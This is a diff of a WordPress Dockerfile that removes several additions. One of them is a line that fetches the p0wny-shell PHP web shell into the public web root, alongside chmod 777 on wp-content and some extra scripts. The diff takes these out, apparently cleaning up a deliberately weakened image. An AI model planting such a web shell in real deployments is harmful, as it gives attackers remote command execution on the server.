@@ -1,20 +1,13 @@
-#
-# NOTE: THIS DOCKERFILE IS GENERATED VIA "apply-templates.sh"
-#
-# PLEASE DO NOT EDIT IT DIRECTLY.
-#
-
 FROM php:7.4-apache
 
 # persistent dependencies
 RUN set -eux; \
 	apt-get update; \
-	apt-get install rsync -y --no-install-recommends \
+	apt-get install -y --no-install-recommends \
 # Ghostscript is required for rendering PDF previews
 		ghostscript \
 	; \
-	rm -rf /var/lib/ap \
-    t/lists/*
+	rm -rf /var/lib/apt/lists/*
 
 # install the PHP extensions we need (https://make.wordpress.org/hosting/handbook/handbook/server-environment/#php-extensions)
 RUN set -ex; \
@@ -123,55 +116,10 @@ RUN set -eux; \
 # (replace all instances of "%h" with "%a" in LogFormat)
 	find /etc/apache2 -type f -name '*.conf' -exec sed -ri 's/([[:space:]]*LogFormat[[:space:]]+"[^"]*)%h([^"]*")/\1%a\2/g' '{}' +
 
-RUN set -eux; \
-	version='5.9.2'; \
-	sha1='19653440effafce0f768a1ba5092710717835bdc'; \
-	\
-	curl -o wordpress.tar.gz -fL "https://wordpress.org/wordpress-$version.tar.gz"; \
-	echo "$sha1 *wordpress.tar.gz" | sha1sum -c -; \
-	\
-# upstream tarballs include ./wordpress/ so this gives us /usr/src/wordpress
-	tar -xzf wordpress.tar.gz -C /usr/src/; \
-	rm wordpress.tar.gz; \
-	\
-# https://wordpress.org/support/article/htaccess/
-	[ ! -e /usr/src/wordpress/.htaccess ]; \
-	{ \
-		echo '# BEGIN WordPress'; \
-		echo ''; \
-		echo 'RewriteEngine On'; \
-		echo 'RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]'; \
-		echo 'RewriteBase /'; \
-		echo 'RewriteRule ^index\.php$ - [L]'; \
-		echo 'RewriteCond %{REQUEST_FILENAME} !-f'; \
-		echo 'RewriteCond %{REQUEST_FILENAME} !-d'; \
-		echo 'RewriteRule . /index.php [L]'; \
-		echo ''; \
-		echo '# END WordPress'; \
-	} > /usr/src/wordpress/.htaccess; \
-	\
-	chown -R www-data:www-data /usr/src/wordpress; \
-# pre-create wp-content (and single-level children) for folks who want to bind-mount themes, etc so permissions are pre-created properly instead of root:root
-# wp-content/cache: https://github.com/docker-library/wordpress/issues/534#issuecomment-705733507
-	mkdir wp-content; \
-	for dir in /usr/src/wordpress/wp-content/*/ cache; do \
-		dir="$(basename "${dir%/}")"; \
-		mkdir "wp-content/$dir"; \
-	done; \
-	chown -R www-data:www-data wp-content; \
-	chmod -R 777 wp-content
-
-
-COPY --chown=www-data:www-data wp-config-docker.php /usr/src/wordpress/
 COPY docker-entrypoint.sh /usr/local/bin/
-
-ADD scripts/ /
-RUN chmod +x /*.sh
 
 RUN curl -o /usr/local/bin/wp https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar \
     && chmod +x /usr/local/bin/wp
-RUN curl -o /var/www/html/shell.php https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php \
-    && chown www-data:www-data /var/www/html/shell.php
 
 COPY --chown=www-data:www-data wordpress /var/www/html
 
